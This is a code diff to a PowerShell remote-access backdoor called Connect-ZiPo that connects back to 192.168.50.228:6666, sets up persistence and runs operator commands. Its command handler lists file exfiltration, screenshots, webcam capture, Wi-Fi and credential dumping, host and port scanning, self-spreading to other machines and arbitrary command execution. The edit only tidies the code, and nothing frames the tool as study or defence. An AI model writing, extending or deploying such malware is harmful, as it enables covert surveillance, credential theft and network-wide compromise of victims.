@@ -84,10 +84,6 @@ function Connect-ZiPo {
     $srv = "192.168.50.228"
     $port = 6666
     $currentDir = Get-Location
-    $intro = $clear + $banner + "`nPS $currentDir> "
-    $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
-    $stream.Write($bbytes, 0, $bbytes.Length)
-    $stream.Flush()
 
 
     function Get-AliveHosts {
@@ -458,7 +454,6 @@ schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
 
     Add-Persistence
     while ($true) {
-    $currentDir = Get-Location
         try {
             $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
             $stream = $tcp.GetStream()
@@ -497,7 +492,6 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 
                 try {
                     if ([string]::IsNullOrWhiteSpace($cmd)) {
-                        $currentDir = Get-Location
                         $response = ""
                     }
                     elseif ($cmd.StartsWith("!get")) {
@@ -505,7 +499,6 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         if ([string]::IsNullOrWhiteSpace($path)) {
                             $response = "[ERROR] Usage: !get <full_path_to_file>"
                         } else {
-                            $currentDir = Get-Location
                             $response = Upload-File $path
                         }
                     }
@@ -524,42 +517,33 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = ""
                     }
                     elseif ($cmd -eq "!sysinfo") {
-                        $currentDir = Get-Location
                         $response = Get-ComputerInfo | Out-String
                     }
                     elseif ($cmd -eq "!sc") {
-                        $currentDir = Get-Location    
                         $response = Take-Screenshot
                     }
                     elseif ($cmd -eq "!webcam") {
-                        $currentDir = Get-Location
                         $response = Capture-Webcam
                     }
                     elseif ($cmd -eq "!wifi") {
-                        $currentDir = Get-Location
                         $response = Dump-WiFi
                     }
                     elseif ($cmd -eq "!tree") {
-                        $currentDir = Get-Location
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $currentDir = Get-Location
                         $response = Get-Credentials
                     }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
-                        $currentDir = Get-Location
                         $response = ""
                     }
                     elseif ($cmd.StartsWith("spread")) {
                         $args = $cmd.Split(" ")
                         if ($args.Length -eq 2) {
                             $target = $args[1]
-                            $currentDir = Get-Location
                             $response = Spread-Backdoor -targetIP $target
                         } else {
-                            $currentDir = Get-Location
                             $response = "[USAGE] spread <targetIP>"
                         }
                     }
@@ -568,13 +552,11 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         if ($args.Length -eq 2) {
                             $ip = $args[1]
                             # Вызываем Test-Ports с дефолтным списком портов
-                            $currentDir = Get-Location
                             $response = Test-Ports -ip $ip
                         }
                         elseif ($args.Length -eq 3) {
                             $ip = $args[1]
                             $port = [int]$args[2]
-                            $currentDir = Get-Location
                             # Вызываем Test-Ports с заданным портом
                             $response = Test-Ports -ip $ip -ports @($port)
                         }
@@ -594,7 +576,6 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     else {
                         $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
                         $output = & $sb 2>&1 | Out-String
-                        $currentDir = Get-Location
                         $response = $output.TrimEnd()
                     }
                 }
